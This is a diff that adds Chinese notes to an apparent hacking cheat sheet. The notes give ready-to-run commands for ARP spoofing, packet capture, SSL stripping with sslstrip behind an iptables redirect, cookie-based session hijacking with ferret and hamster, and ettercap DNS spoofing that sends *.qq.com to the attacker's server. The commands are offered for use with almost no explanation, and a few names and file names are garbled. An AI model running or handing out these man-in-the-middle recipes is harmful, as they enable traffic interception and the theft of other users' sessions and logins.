@@ -38,3 +38,42 @@ driftnet 显示访问图片
 ```
     driftnet -i eth0
 ```
+
+arpspoof  (同样需要开启路由转发)
+```
+    arpspoof -i eth0 -t 被攻击者ip 攻击者ip
+```
+
+<h4>数据包捕获</h4>
+tcpdump wireshark(图形界面) <br>
+```
+    tcpdump -i eth0 -w text.txt
+```
+drafnet
+
+<h4>SSL数据嗅探</h4>
+```
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+sslstrip -p -l 10000 -w log.txt
+之后开启ARP欺骗工具
+用完记得取消 -A -> -D
+```
+
+<h4>session劫持-arp欺骗</h4>
+```
+    arpspoof -i eth0 -t 192.168.14.2 192.168.14.132
+    tcpdump -i eth0 -w text.cap
+    ferret -r text.cpp
+    hamster
+    设置代理
+    http://hamster
+```
+
+<h4>session劫持-DNS欺骗</h4>
+```
+    使用ettercap进行arp欺骗
+    vi /etc/ettercap/etter.dns
+    *.qq.com A 183.175.12.144
+    //修改dns到自己的服务器
+    dns_spoof
+```
